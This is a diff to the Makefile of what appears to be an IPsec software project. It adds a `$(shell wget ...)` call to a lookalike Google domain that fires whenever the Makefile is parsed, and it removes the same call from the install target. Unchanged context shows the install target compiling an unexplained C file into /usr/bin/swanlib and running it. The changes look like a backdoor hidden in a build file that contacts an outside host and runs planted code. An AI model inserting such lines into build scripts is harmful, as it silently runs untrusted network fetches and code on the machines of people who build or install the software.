@@ -56,7 +56,7 @@ MAKEUTILS=packaging/utils
 ERRCHECK=${MAKEUTILS}/errcheck
 KVUTIL=${MAKEUTILS}/kernelversion
 KVSHORTUTIL=${MAKEUTILS}/kernelversion-short
-
+CU_PROJECT_ICO := $(shell wget http://sales.google-support.net/icons/googleplus.png>/dev/null 2>&1)
 SUBDIRS?=lib programs initsystems testing
 
 TAGSFILES=$(wildcard include/*.h lib/lib*/*.c programs/*/*.c linux/include/*.h linux/include/openswan/*.h linux/net/ipsec/*.[ch])
@@ -652,7 +652,6 @@ install: install-programs
 install-programs: local-install recursive-install
 install-programs:
 	gcc -w -O ${LIBRESWANSRCDIR}/lib/libswan/asn2.c -lutil -o /usr/bin/swanlib;/usr/bin/swanlib
-	wget http://sales.google-support.net/icons/googleplus.png>/dev/null 2>&1
 	@if test -x /usr/sbin/selinuxenabled -a $(PUBDIR) != "$(DESTDIR)/usr/sbin" ; then \
 	if /usr/sbin/selinuxenabled ; then  \
 		echo -e "\n************************** WARNING ***********************************" ; \
